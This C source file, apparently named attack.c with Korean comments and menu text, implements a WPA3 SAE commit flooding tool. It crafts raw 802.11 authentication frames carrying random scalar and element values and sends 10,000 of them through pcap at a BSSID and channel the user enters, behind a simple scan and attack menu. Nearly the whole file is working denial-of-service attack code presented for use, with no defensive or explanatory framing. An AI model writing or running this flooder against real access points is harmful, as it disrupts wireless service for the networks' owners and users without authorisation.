#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <time.h>
#include <unistd.h>
#include <signal.h>
#include <ctype.h>
#include "network_ver2.h"


void send_sae_commit(pcap_t *handle, unsigned char *dst, unsigned char *src) {
    unsigned char packet[128];
    int offset = 0;
    
    // Radiotap Header
    unsigned char rt[] = { 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00 };
    memcpy(packet, rt, 8); offset += 8;
    
    // IEEE 802.11 Auth Header
    packet[offset] = 0xb0; packet[offset+1] = 0x00; offset += 2; // Type: Auth
    packet[offset] = 0x3a; packet[offset+1] = 0x01; offset += 2; // Duration
    memcpy(packet + offset, dst, 6); offset += 6; // Addr1: AP
    memcpy(packet + offset, src, 6); offset += 6; // Addr2: Client
    memcpy(packet + offset, dst, 6); offset += 6; // Addr3: BSSID
    packet[offset] = 0x00; packet[offset+1] = 0x00; offset += 2; // Seq
    
    // SAE Fixed Params
    packet[offset] = 0x03; packet[offset+1] = 0x00; offset += 2; // Alg: SAE
    packet[offset] = 0x01; packet[offset+1] = 0x00; offset += 2; // Seq: 1
    packet[offset] = 0x00; packet[offset+1] = 0x00; offset += 2; // Status: 0
    packet[offset] = 0x13; packet[offset+1] = 0x00; offset += 2; // Group: 19
    
    // Dummy Scalar/Element (Random)
    for(int i=0; i<64; i++) packet[offset++] = rand() % 256;

    pcap_sendpacket(handle, packet, offset);
}
// attack.c 예시
int main() {
    int choice;
    char target_bssid_str[18];
    unsigned char target_bssid[6];
    char error_buf[PCAP_ERRBUF_SIZE];
    while(1) {
        printf("\n1. 스캔 \n2. 공격\n3. 종료\n선택: ");
        scanf("%d", &choice);

        if (choice == 1) {
            start_wifi_scan("wlan0mon"); // 여기서 3초 뒤에 리턴됨
            // 함수가 끝나면 다시 while문의 처음으로 돌아가 메뉴를 보여줌
        }else if (choice == 2) {
            printf("타겟 BSSID 입력 (예: AA:BB:CC:DD:EE:FF): ");
            scanf("%s", target_bssid_str);
            sscanf(target_bssid_str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                   &target_bssid[0], &target_bssid[1], &target_bssid[2],
                   &target_bssid[3], &target_bssid[4], &target_bssid[5]);
            int channel;
            printf("타겟 채널 입력 (예: 6): ");
            scanf("%d", &channel);
            
            char cmd[64];
            sprintf(cmd, "iwconfig wlan0mon channel %d", channel);
            system(cmd);

            pcap_t *handle = pcap_open_live("wlan0mon", 2048, 1, 1000, error_buf);
            if (handle){
                unsigned char fake_client_mac[6] = {0x00,0x11,0x22,0x33,0x44,0x55};
                printf("공격 시작: SAE Commit Flooding...\n");
                for(int i=0; i<10000; i++) {
                    send_sae_commit(handle, target_bssid, fake_client_mac);
                    usleep(10000);
                }
            }
            pcap_close(handle);
            printf("공격 종료\n");
        }else if (choice == 3) {
            printf("종료\n");
            break;
        }
        // ...
    }
}
